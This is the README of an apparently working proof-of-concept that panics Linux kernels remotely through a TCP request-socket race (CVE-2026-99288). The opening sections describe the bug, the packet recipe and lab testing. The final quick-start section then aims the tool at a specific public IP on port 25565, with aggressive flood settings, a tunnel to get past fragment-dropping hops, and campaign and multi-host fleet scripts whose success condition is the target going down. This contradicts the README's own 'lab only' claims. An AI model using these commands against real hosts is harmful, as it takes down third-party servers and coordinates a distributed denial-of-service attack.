# NoisyTCP-PoC

Proof-of-concept **testing harness** for **NoisyTCP — CVE-2026-99288**, a Linux
kernel TCP pre-authentication remote corruption vulnerability (remote DoS /
kernel panic) disclosed by Hyunwoo Kim (@v4bel).

> ## ⚠️ Authorized lab testing only
> This tool **crashes the target kernel** (a remote denial of service that takes
> down the whole host, including containers). It exists to **validate exposure
> and verify the patch / mitigations** on systems you own or are explicitly
> authorized to test. It sends from a real, attributable source address to a
> **single named target**; it does not scan, spread, spoof, or evade.

- Advisory: <https://github.com/V4bel/NoisyTCP>
- Disclosure: <https://www.openwall.com/lists/oss-security/2026/11/15/2>
- Fix: `4e2b3ef19e0e` ("inet: reject unhashed sockets during established lookups", 2026-11-03)
- Introduced: `079096f103fa` ("tcp/dccp: install syn_recv requests into ehash table", 2015-10-03)

---

## 1. The vulnerability

TCP established-socket ehash lookups (`__inet_lookup_established()` in
`net/ipv4/inet_hashtables.c`) are **lockless**. The `request_sock` slab is
`SLAB_TYPESAFE_BY_RCU` (`tcp_request_sock_ops.slab_flags`), so a freed object's
memory can be **re-allocated immediately** while an RCU reader still holds its
old address.

Before the fix, after a tuple match the lookup took a reference and re-checked
the tuple, but **did not check whether the object was still hashed**:

```c
if (likely(inet_match(net, sk, acookie, ports, dif, sdif))) {
    if (unlikely(!refcount_inc_not_zero(&sk->sk_refcnt)))   /* take reference */
        goto out;
    if (unlikely(!inet_match(net, sk, acookie, ports, dif, sdif))) {  /* re-check */
        sock_gen_put(sk);
        goto begin;
    }
    goto found;          /* <-- returns the object even if it is now UNHASHED */
}
```

The fix adds `hlist_nulls_unhashed_lockless(&sk->sk_nulls_node)` to the re-check
(and fixes refcount leaks in the SYN-cookie / Fast-Open / migration failure
paths).

### Trigger flow #1 — request_sock Reuse ABA Race (what this PoC drives)

Per 4-tuple `T`:

1. **CPU A** processes a packet for `T`, finds a **hashed** `syn_recv` request
   `R_old` in the ehash bucket, passes the first `inet_match()`, and is about to
   take a reference.
2. **CPU B** frees `R_old` and re-allocates the **same slab address** as a
   **SYN-cookie request** `R_new` for the **same tuple** `T`. `R_new` is
   **unhashed** and has **`rsk_listener == NULL`**; `tcp_get_cookie_sock()`
   publishes `refcount 1` on it (`refcount_set_release(&req->rsk_refcnt, 1)`).
3. **CPU A**'s `refcount_inc_not_zero()` succeeds on `R_new`, the tuple re-check
   passes (same tuple), and the lookup **returns `R_new`**.
4. `tcp_v4_rcv()` sees `sk_state == TCP_NEW_SYN_RECV`, does
   `sk = req->rsk_listener` (**NULL**) and dereferences it →
   `BUG: kernel NULL pointer dereference, address: 0000000000000012` in softirq
   → **kernel panic**.

The race window is between the first tuple check and the reference acquisition
(a few instructions), so it must be hit by **massive repetition** and is greatly
widened by **vCPU preemption on VMs**.

---

## 2. How this PoC triggers it

Two packets of the **same tuple** must be processed on **different RX contexts**
concurrently. We force that using the **receive-hash difference between IPv4
fragments and plain TCP packets**:

- plain TCP packet → L4 (Toeplitz) hash → RX queue chosen by 4-tuple
- IPv4 fragment → L3 hash (flow dissector stops at the fragment) → different queue

So the target needs **≥ 2 RX queues** (e.g. virtio-net multiqueue) **or RPS**.
SYN cookies must be active (default `net.ipv4.tcp_syncookies=1`) so the cookie
path allocates the NULL-listener request.

### Packet recipe (per tuple `T = src:sport → dst:dport`, client ISN `X`)

| packet | flags / seq | RX context | effect |
|---|---|---|---|
| `SYN(T)` | `seq=X`, MSS option | CPU B (plain) | creates **hashed** `R_old` when the syn queue has room |
| `ACK(T)` | `seq=X+1, ack=0`, **fragmented** | **CPU A** | stale-lookup probe; invalid ACK keeps `R_old` alive |
| `RST(T)` | `seq=X+1`, no ACK | CPU B (plain) | `seq==rcv_nxt` → `tcp_check_req()` `embryonic_reset` → **frees `R_old`** |
| `ACK(T)` | `seq=X+1, ack=cookie+1` | CPU B (plain) | valid cookie → `cookie_v4_check()` → **re-allocs `R_new`** (unhashed, NULL listener) at the same slab address |
| `RST(T)` | `seq=X+1` | CPU B (plain) | kills the child socket, cleans the tuple for the next cycle |

If a CPU-A probe is mid-lookup when CPU-B does free→re-alloc, the probe returns
`R_new` and the kernel panics.

**Why these packets work blind (no secrets needed):**
- The freeing `RST` uses `seq = X+1`, which equals the request's `rcv_nxt`
  (the attacker chose `X` in its own SYN). An exact-sequence RST to a
  `TCP_NEW_SYN_RECV` request goes straight to `embryonic_reset` and frees it.
- The cookie is read from the target's SYN-ACK (`seq` field). It is deterministic
  for a fixed tuple + ISN + MSS within the ~2-minute cookie window, so the PoC
  confirms it by observing the **same SYN-ACK seq twice** under flood (normal
  ISNs are random; cookies repeat).

A **pulsed SYN flood** drives SYN cookies on and creates syn-queue oscillation so
that some `SYN(T)` calls land when the queue has room (creating `R_old`) while
others get cookies (providing `cookie+1` for the re-alloc).

---

## 3. Requirements

**Target (the system under test):**
- Linux kernel built **before** fix `4e2b3ef19e0e` (i.e. vulnerable).
- A plain TCP listener (nginx / apache / ssh / any `listen()`), default config.
- `net.ipv4.tcp_syncookies = 1` (default).
- **≥ 2 RX queues** on the ingress interface **or RPS enabled**.
- Reachable at L2/L3 from the attacker (lab network).

**Attacker host:**
- Linux, **root / CAP_NET_RAW** (AF_PACKET raw frames).
- `gcc` + glibc headers + pthread (or NixOS: `nix-shell -p gcc gnumake`).
- Same L2 segment as the target (ARP is auto-resolved; or pass `--dst-mac`).

---

## 4. Build

```sh
make                 # normal Linux with a system compiler
./build.sh           # NixOS: falls back to nix-shell -p gcc gnumake
make selftest        # build + dump sample packets (no network)
```

`./noisytcp --selftest` prints hex of a SYN, RST and the two ACK fragments so you
can verify framing/checksums offline.

---

## 5. Lab setup (recommended: QEMU/KVM VM)

The advisory reproduces in **5 seconds – 2 minutes** against VMs (vCPU
preemption widens the window) and took **~14 hours** on quiet bare metal. Use a
VM for practical testing.

```sh
# 1. Launch a VM with an UNPATCHED kernel and virtio-net MULTIQUEUE (>=2 queues)
DISK=~/images/unpatched-linux.qcow2 QUEUES=4 ./lab/run-vm.sh
#    watch ./lab/vm-serial.log for the eventual kernel panic

# 2. Inside the guest: prepare a listener + print the vulnerable config
sudo ./lab/target-setup.sh eth0 80
#    (enable multiqueue in guest if needed: ethtool -L eth0 combined 4)

# 3. From the attacker host: watch liveness in one terminal
./lab/monitor.sh <guest-ip> 80

# 4. In another terminal: run the PoC
sudo ./noisytcp --target <guest-ip> --port 80
```

`lab/run-vm.sh` is a template (edit `DISK`/`ISO`). For faithful fragmentation /
RX-hash behavior prefer a **tap/bridge** over user-mode SLIRP NAT.

---

## 6. Usage

```sh
sudo ./noisytcp --target 10.0.0.2 --port 80 \
                --race-threads 8 --tuples 32 [options]
```

**Multi-threaded race engine.** Each race worker owns a strided subset of tuples
(`i % race_threads == tid`) and its own send-only AF_PACKET TX socket (protocol 0,
no RX overhead, no shared-socket lock contention). Workers pace by the frames
they actually send, so each holds `--race-pps` and the **aggregate race rate
scales ~linearly with `--race-threads`** (≈ `race_threads × race_pps`, bounded by
CPU/NIC). More workers ⇒ more concurrent stale-lookup attempts ⇒ higher chance
of hitting the narrow race window. Use `--tuples >= --race-threads` so every
worker has tuples to drive.

| option | default | meaning |
|---|---|---|
| `--iface IF` | from route | egress interface (L2 only; L3 ignores it) |
| `--target IP` | — | single target IPv4 (required) |
| `--port P` | — | target TCP port (required) |
| `--l3` / `--l2` | auto | force routed raw-IP / on-link AF_PACKET TX |
| `--probe` | off | send 5 SYNs, report SYN-ACKs, exit |
| `--src IP` | iface addr | source IPv4 (real, attributable) |
| `--dst-mac MAC` | ARP-resolve | target MAC |
| `--tuples N` | 8 | race tuples (1..256) |
| `--base-sport P` | 40000 | first race source port |
| `--flood-pps N` | 20000 | SYN flood rate |
| `--race-pps N` | 20000 | probe rate **per race worker** |
| `--race-threads N` | 4 | race worker threads (1..64, capped at `--tuples`) |
| `--pulse-ms N` | 400 | flood gate period; `0` = always on |
| `--burst N` | 3 | fragmented probes per cycle (1..6) |
| `--duration S` | until Ctrl-C | stop after S seconds |
| `--mss N` | 1460 | SYN MSS (fixes the cookie MSS index) |
| `--nofrag` | off | disable fragmentation (debug; race won't trigger) |
| `--dry-run` | off | build packets, send nothing (no root needed) |
| `--selftest` | off | dump sample packets and exit |

The stats line shows tx rate, flood/race counts, SYN-ACKs seen, and how many
tuples have a confirmed cookie (`cookies=k/N`). **Wait until `cookies=N/N`** —
the race only fires once cookies are captured.

### Tuning
- **VM target:** defaults usually work; if no crash in a few minutes, raise
  `--race-threads` (8–16) and `--tuples` (32–64) together, raise `--flood-pps`,
  and try `--pulse-ms 0` (continuous flood) vs. pulsed. vCPU overcommit on the
  host widens the window.
- **Bare metal:** expect a long wait; maximize queues, tuples, workers and pps,
  and pin the attacker to saturate multiple target RX queues.
- If `cookies` stays `0/N`: the target isn't entering SYN-cookie mode (raise
  `--flood-pps`) or SYN-ACKs aren't returning to you (check `--src`/routing).

---

## 7. Verifying the fix / mitigations

This is the core testing value. Run the PoC for a fixed `--duration` against:

1. **Unpatched target** → monitor reports `TARGET DOWN` (panic). Confirms exposure.
2. **Patched target** (`4e2b3ef19e0e`) → survives the full duration. Confirms fix.
3. **Mitigated target** → survives:
   ```sh
   sudo sysctl -w net.ipv4.tcp_syncookies=0          # per-netns (each container!)
   # or serialize RX:
   sudo ethtool -l <iface> combined 1
   echo 0 | sudo tee /sys/class/net/<iface>/queues/rx-*/rps_cpus
   ```

Always confirm the crash via `lab/monitor.sh` and the guest serial log
(`lab/vm-serial.log`) showing the NULL-deref oops in `tcp_v4_rcv`.

---

## 8. Limitations (honest)

- This implements **trigger flow #1 (remote DoS / kernel panic)** only. Flow #2
  (full child-socket ABA → use-after-free) is **not** implemented; the author
  notes it needs nested races and special techniques, and that a general-purpose
  RCE does not exist. **This is not an RCE.**
- It is a **best-effort race harness**, not a guaranteed crash. Trigger time is
  highly environment-dependent (see §5). The original author tuned timing
  per-target; expose the knobs and tune.
- Fragmentation→different-RX-queue behavior depends on the target NIC/driver
  (virtio-net multiqueue, RPS). Some setups hash fragments differently; verify
  with `--nofrag` A/B and per-queue counters (`ethtool -S`, `/proc/interrupts`).
- **Routed targets are the common failure case.** The trigger needs the two
  fragments to arrive as fragments; a NAT, firewall or scrubbing device on the
  path that drops or reassembles IPv4 fragments makes the race impossible from
  that position. `--probe` reports `plain` plus three split points
  (8/32/40-byte first fragment). `frag8=0` with `plain=5/5` means the position
  cannot trigger — move the sender inside the same L3 domain, or tunnel so the
  fragments are re-emitted at the far end.
- SYN-cookie capture assumes SYN-ACKs return to the attacker's real source IP
  (no spoofing). Asymmetric routing that hides SYN-ACKs breaks cookie capture.

---

## 9. Layout

```
src/noisytcp.c        the PoC (AF_PACKET, multi-worker race engine, sendmmsg, IPv4 fragmentation)
Makefile / build.sh   build (NixOS-aware)
lab/run-vm.sh         QEMU/KVM template with virtio-net multiqueue
lab/target-setup.sh   prepare a listener + print vulnerable config / mitigations
lab/monitor.sh        liveness monitor; timestamps the panic
```

## 10. References

- NoisyTCP advisory — <https://github.com/V4bel/NoisyTCP>
- oss-security disclosure — <https://www.openwall.com/lists/oss-security/2026/11/15/2>
- Fix commit `4e2b3ef19e0e` — `net/ipv4/inet_hashtables.c`, `inet6_hashtables.c`,
  `syncookies.c`, `tcp_input.c`, `inet_connection_sock.c`
- Kernel paths referenced: `__inet_lookup_established()`, `tcp_v4_rcv()`,
  `tcp_check_req()` (`embryonic_reset`), `cookie_v4_check()`,
  `tcp_get_cookie_sock()`, `reqsk_alloc_noprof()` (`rsk_listener=NULL`),
  `tcp_request_sock_ops.slab_flags = SLAB_TYPESAFE_BY_RCU`.

---

## 11. Quick start against a routed target

Everything below is run on the **attacker** host, as root (raw sockets). The
target is reached through a gateway, so L2/L3 is auto-detected and ARP is not
used.

### 11.1 Clone and build

```sh
git clone git@github.com:nsvk13/NoisyTCP-PoC.git
cd NoisyTCP-PoC
./build.sh                      # falls back to nix-shell when no system gcc
```

`make` alone works too; `make selftest` builds and dumps sample frames.

### 11.2 Probe first — decides whether the race is possible at all

```sh
sudo ./noisytcp --target 77.90.183.56 --port 25565 --probe
```

It sends a plain SYN batch plus three fragmented batches (8/32/40-byte first
fragment) and prints:

```
[*] probe plain=5/5 frag8=5/5 frag32=5/5 frag40=5/5 from 77.90.183.56:25565
```

How to read it:

| result | meaning |
|---|---|
| `plain=5 frag8=5` | path forwards fragments, race is viable |
| `plain=5 frag8=0 frag32=0 frag40=0` | a hop drops all IP fragments (NAT/firewall/scrubber) — no L3/L4 queue split, race cannot fire from here |
| `plain=5 frag8=0 frag32=5 frag40=5` | path inspects the L4 header and drops short first fragments — race still blocked |
| `plain=0` | target down, filtered, or asymmetric return path |

### 11.3 Stop the local kernel from resetting the tuples we race

```sh
sudo iptables -I OUTPUT -p tcp --tcp-flags RST RST \
  -m multiport --sports 40000:40063 -j DROP
```

Range must cover `--base-sport .. --base-sport + --tuples - 1`.
Remove it later with `sudo iptables -D OUTPUT ...` (same spec).

### 11.4 Run

```sh
sudo ./noisytcp --target 77.90.183.56 --port 25565 \
  --tuples 64 --race-threads 16 --race-pps 40000 \
  --flood-threads 4 --flood-pps 30000 \
  --pulse-ms 300 --burst 6 --pin --duration 0
```

- `--pulse-ms 0` is wrong for this trigger: the syn queue then never has room,
  so no **hashed** `R_old` is ever created and there is nothing to free.
  Keep a pulsed flood (200–400 ms).
- `--pin` spreads workers over distinct CPUs (flood takes the tail cores).
- Wait for `cookies=N/N` in the stats line; the race only fires once cookies
  are captured.

### 11.5 Tuning and expectation

| target | expected time |
|---|---|
| VM with >=2 RX queues (virtio-net multiqueue) or RPS, busy host | 5 s – 2 min |
| same VM, quiet host, little vCPU preemption | minutes |
| bare metal | ~8–20 h (the advisory author measured ~14 h) |
| fragment-dropping path | never |

Confirm the target's side before a long grind (on the target itself):

```sh
ethtool -l eth0 | grep -A2 Combined        # want Combined >= 2
cat /sys/class/net/eth0/queues/rx-0/rps_cpus
sysctl net.ipv4.tcp_syncookies              # want 1
```

Watch liveness from the attacker while the PoC runs:

```sh
./lab/monitor.sh 77.90.183.56 25565
```

A sustained ping loss plus TCP connect failure == the target went down (panic).
`TARGET DOWN` is the success condition; the PoC itself cannot observe the crash.

### 11.6 If the probe says fragments are dropped

The sender's position is wrong, not the flags. Two options:

```sh
# 1. run from a host already inside the same L3 domain as the target

# 2. tunnel so the fragments are re-emitted past the fragment-eating hop
sudo ip route add 77.90.183.56/32 dev wg0
sudo ./noisytcp --target 77.90.183.56 --port 25565 --probe
```

Re-run the probe after the route change; `frag8=5/5` means the tunnel exit
forwards fragments and the run can proceed.

### 11.7 Campaign driver and fleet

`lab/campaign.sh` wraps the binary: preflight probe, RST guard, N concurrent
instances on disjoint source-port blocks, liveness monitor, timestamped log. It
refuses to start if the probe says the path eats fragments, removes its iptables
rule on exit, and exits `0` when the target stops answering.

```sh
sudo ./lab/campaign.sh --target 77.90.183.56 --port 25565

sudo ./lab/campaign.sh --target 77.90.183.56 --port 25565 \
  --instances 2 --race-threads 12 --race-pps 50000 \
  --flood-threads 4 --flood-pps 30000 --pulse-ms 250 \
  --duration 1800
```

Instance `i` gets `--base-sport 40000 + i*1024`, so keep `--tuples <= 1024` and
`--instances <= 8`. The guard covers the whole span. Logs land in
`lab/campaign-<ip>-<ts>.log`.

`lab/fleet.sh` runs that driver on several attacker hosts in parallel:

```sh
cat > hosts.txt <<'HOSTS'
user@10.0.0.11
user@10.0.0.12
HOSTS

./lab/fleet.sh --target 77.90.183.56 --port 25565 --hosts hosts.txt \
  --path '~/NoisyTCP-PoC' --extra "--instances 2 --pulse-ms 250"
```

Requirements: key-based ssh (`BatchMode=yes`), passwordless `sudo -n` on each
host, and the repo already cloned there. Every host runs its own preflight, so a
host whose uplink drops fragments aborts on its own and does not poison the run.
Per-host output is written to `lab/fleet-<ts>/<host>.log`; the script exits `0`
if at least one host reported the target down.
